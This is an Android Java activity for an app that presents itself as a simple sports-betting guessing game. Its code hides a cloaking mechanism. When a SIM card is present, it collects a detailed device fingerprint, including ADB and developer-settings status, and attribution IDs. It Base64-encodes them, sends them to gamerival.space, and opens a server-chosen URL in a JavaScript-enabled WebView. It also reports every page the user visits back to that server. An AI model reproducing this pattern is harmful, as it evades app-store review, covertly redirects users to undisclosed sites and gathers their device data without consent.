package com.xbetvsfonbet.competition;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.TextView;

import com.appsflyer.AppsFlyerLib;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Date;
import java.util.HashMap;
import java.util.Objects;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ChooseActivity extends AppCompatActivity {

    TextView tvScore;

    private WebView aso;
    private View sport;
    private View jdem;
    private ValueCallback<Uri[]> uploadMessage;
    private final static int FILECHOOSER_RESULTCODE=1;

    private Handler figo;
    private String identiApp = "";
    private String dopo = "null";
    private String identiAtr = "null";

    private static boolean betEr = false;

    int adb, development_setting;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_choose);

        adb = android.provider.Settings.Global.getInt(getApplicationContext().getContentResolver(), "adb_enabled", 0);
        development_setting = Settings.Secure.getInt(getApplicationContext().getContentResolver(), "development_settings_enabled", 0);

        tvScore = findViewById(R.id.tv_score);

        ImageView imageView = findViewById(R.id.iv_basketball);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startBet(GameType.Basketball);
            }
        });
        imageView = findViewById(R.id.iv_volleyball);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startBet(GameType.Volleyball);
            }
        });
        imageView = findViewById(R.id.iv_exit);
        imageView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });
        TextView privacyPolicy = (TextView) findViewById(R.id.pololo);
        privacyPolicy.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                fomo("https://sites.google.com/view/1betvsfnbet");
            }
        });

        TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        int simState = telMgr.getSimState();
        if (simState == TelephonyManager.SIM_STATE_ABSENT) {
            sport = (View) findViewById(R.id.xbet);
            jdem = (View) findViewById(R.id.jdem);
            jdem.setVisibility(View.INVISIBLE);
            sport.setVisibility(View.VISIBLE);

            imageView = findViewById(R.id.iv_basketball);
            imageView.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    startBet(GameType.Basketball);
                }
            });
            imageView = findViewById(R.id.iv_volleyball);
            imageView.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    startBet(GameType.Volleyball);
                }
            });
            imageView = findViewById(R.id.iv_exit);
            imageView.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    finishAffinity();
                }
            });

            TextView privacyPolicySim = (TextView) findViewById(R.id.pololo);
            privacyPolicySim.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    fomo("https://sites.google.com/view/1betvsfnbet");
                }
            });
        } else {
            start();
        }
    }

    @Override
    protected void onStart() {
        super.onStart();

        tvScore.setText(getString(R.string.totalScore, AppApplication.getTotalScore()));
    }
    private void startBet(GameType gameType) {
        int firstTeam = AppApplication.getRandom(TeamType.values().length);
        int secondTeam = AppApplication.getRandom(TeamType.values().length, firstTeam);
        AppApplication.setFirstTeam(TeamType.values()[firstTeam]);
        AppApplication.setSecondTeam(TeamType.values()[secondTeam]);

        Intent intent = BetActivity.getStartIntent(this, gameType);
        startActivity(intent);
    }
    private void fomo(String s) {
        Uri uri = Uri.parse(s);
        startActivity(new Intent(Intent.ACTION_VIEW,uri));
    }

    @SuppressLint("UseCompatLoadingForDrawables")
    public void start(){
        appOpen();
        initViews();
        figo = new Handler(Looper.getMainLooper(), msg -> {
            if (msg.obj.equals("close"))
                sport.setVisibility(View.VISIBLE);
            else if (msg.obj.equals("close"))
                jdem.setVisibility(View.INVISIBLE);
            else
                opn((String) msg.obj);
            return false;
        });

        String read = read();

        trackers();

        getReferer();
    }

    private void initViews(){
        aso = findViewById(R.id.weber);
        sport = (View) findViewById(R.id.xbet);
        jdem = (View) findViewById(R.id.jdem);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void opn(String s){
        jdem.setVisibility(View.INVISIBLE);
        sport.setVisibility(View.INVISIBLE);
        aso.setVisibility(View.VISIBLE);
        aso.setWebChromeClient(new MyClient());
        aso.setWebViewClient(new MyWebClient());

        aso.getSettings().setUseWideViewPort(true);
        aso.getSettings().setLoadWithOverviewMode(true);

        aso.getSettings().setDomStorageEnabled(true);
        aso.getSettings().setJavaScriptEnabled(true);
        aso.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        aso.getSettings().setAllowFileAccess(true);
        aso.getSettings().setAllowContentAccess(true);

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_FULL_SENSOR);
        CookieManager.getInstance().setAcceptCookie(true);

        wOpen(s);

        aso.loadUrl(s);


    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == FILECHOOSER_RESULTCODE) {
            if (uploadMessage == null)
                return;
            uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
            uploadMessage = null;
        }
    }

    private class MyClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            uploadMessage = filePathCallback;
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent,"File Chooser"), FILECHOOSER_RESULTCODE);
            return true;
        }
    }

    @Override
    public void onBackPressed() {
        if (aso.canGoBack()) {
            aso.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private void getReferer(){
        identiApp = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        identiAtr = AppsFlyerLib.getInstance().getAttributionId(this);
        if (identiAtr == null)
            identiAtr = "null";

        if (!betEr) {
            new Thread(this::collecting).start();
        }
    }

    private void collecting(){
        betEr = true;
        Message message = new Message();
        message.obj = collect();
        figo.sendMessage(message);
    }

    private class MyWebClient extends WebViewClient {
        @TargetApi(Build.VERSION_CODES.N)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            if(!request.getUrl().toString().contains("accounts.google.com")) {
                if (request.getUrl().toString().startsWith("http"))
                    view.loadUrl(request.getUrl().toString());
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, request.getUrl()));
            }
            return true;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if(!url.contains("accounts.google.com")){
                if (url.startsWith("http"))
                    view.loadUrl(url);
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            }
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            wFinish(url);
            write(url);
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onReceivedError(WebView webview, WebResourceRequest request, WebResourceError error) {
            wError(request.getUrl() + "___" + error.getDescription());
        }
    }

    public String getUUID(){
        SharedPreferences sharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
        String uuid = sharedPreferences.getString("key", "null");

        if (uuid.equals("null")){
            uuid =  String.valueOf(java.util.UUID.randomUUID());
            SharedPreferences mySharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
            @SuppressLint("CommitPrefEdits") SharedPreferences.Editor editor = mySharedPreferences.edit();
            editor.putString("key", uuid);
            editor.apply();
        }
        return uuid;
    }

    public String collect(){
        int i = 0;

        while (true){
            String apsInfo = read_key1("nil");
            if (!apsInfo.equals("nil") || i == 5) {
                String read = read();
                String s = toJSON(apsInfo);
                if (read.length() > 0 && read.contains("ttp")) {
                    return send("https://gamerival.space/api/v1/redirect/create", s); //todo вставить ссылку на апи редирект
                }else {
                    return send("https://gamerival.space/api/v1/redirect/create", s);
                }
            } else {
                try {
                    Thread.sleep(1500);
                    i++;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                    i++;
                }
            }
        }
    }

    private String send(String s, String s1){
        final MediaType JSON = MediaType.get("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(s1, JSON);

        Request request = new Request.Builder()
                .url(s)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try (Response response = client.newCall(request).execute()) {
            String responseString = Objects.requireNonNull(response.body()).string();

            JSONObject respJSON = new JSONObject(responseString);
            Log.d("RESP", respJSON.toString());
            if (respJSON.getBoolean("success")) {
                write(respJSON.getString("url"));
                return respJSON.getString("url");
            }else{
                return "close";
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "close";
        }
    }

    public String toJSON(String apsInfo){
        JSONObject jsonObject= new JSONObject();
        try{
            jsonObject.put("appsFlyerId", identiApp);
            jsonObject.put("deeplink", dopo);
            jsonObject.put("attributionId", identiAtr);
            jsonObject.put("apsInfo", new JSONObject(apsInfo));
            jsonObject.put("phoneInfo", getJson());

            String encodedJson = new String(Base64.encode(jsonObject.toString().getBytes(), Base64.NO_WRAP));
            jsonObject = new JSONObject();
            jsonObject.put("data", encodedJson);

            return jsonObject.toString();
        }catch (Exception e){
            return "";
        }
    }

    private void trackers(){
        OneSignal.initWithContext(this);
        OneSignal.setAppId("4fb25af8-00bc-4688-ba3e-c12e9ec384a4");//todo вставить ключ сигнала

        String externalUserId = getUUID();

        OneSignal.setExternalUserId(externalUserId, new OneSignal.OSExternalUserIdUpdateCompletionHandler() {
            @Override
            public void onSuccess(JSONObject results) {
                try {
                    if (results.has("push") && results.getJSONObject("push").has("success")) {
                        boolean isPushSuccess = results.getJSONObject("push").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for push status: " + isPushSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                try {
                    if (results.has("email") && results.getJSONObject("email").has("success")) {
                        boolean isEmailSuccess = results.getJSONObject("email").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for email status: " + isEmailSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                try {
                    if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                        boolean isSmsSuccess = results.getJSONObject("sms").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for sms status: " + isSmsSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(OneSignal.ExternalIdError error) {
                // The results will contain channel failure statuses
                // Use this to detect if external_user_id was not set and retry when a better network connection is made
                OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id done with error: " + error.toString());
            }
        });

    }

    public void wError(String s){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_e_w");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void appOpen(){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", "null");
            jsonObject.put("name", "a_o");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void wOpen(String s){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_o_w");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void wFinish(String s){
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_p_f");
            jsonObject.put("data",data);
            jsonObject.put("created", new Date().getTime());
        }catch (Exception e){
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    private void send(JSONObject jsonObject){
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.get("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(String.valueOf(jsonObject), JSON);


        Request request = new Request.Builder()
                .url("https://gamerival.space/v1/event/create")//todo вставить ссылку на апи ивентов
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try {
            client.newCall(request).execute();
        }catch (Exception e){
            e.printStackTrace();

        }
    }

    public JSONObject getJson(){
        HashMap<String, String> map = new HashMap<>();
        map.put("user_agent", System.getProperties().getProperty("http.agent"));
        map.put("fingerprint", Build.FINGERPRINT);
        map.put("manufacturer", Build.MANUFACTURER);
        map.put("device", Build.DEVICE);
        map.put("model", Build.MODEL);
        map.put("brand", Build.BRAND);
        map.put("hardware", Build.HARDWARE);
        map.put("board", Build.BOARD);
        map.put("bootloader", Build.BOOTLOADER);
        map.put("tags", Build.TAGS);
        map.put("type", Build.TYPE);
        map.put("product", Build.PRODUCT);
        map.put("host", Build.HOST);
        map.put("display", Build.DISPLAY);
        map.put("id", Build.ID);
        map.put("user", Build.USER);
        map.put("adb_enabled", String.valueOf(adb));
        map.put("development_settings_enabled", String.valueOf(development_setting));

        return new JSONObject(map);
    }

    public void write(String string) {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("file", MODE_PRIVATE)));
            bw.write(string);
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String read() {
        StringBuilder s = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput("file")));
            String str;
            while ((str = br.readLine()) != null) {
                s.append(str);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return s.toString();
    }

    public String read_key1(String def){
        SharedPreferences myPrefs = getSharedPreferences("file", Context.MODE_PRIVATE);
        return myPrefs.getString("key1", def);
    }
}
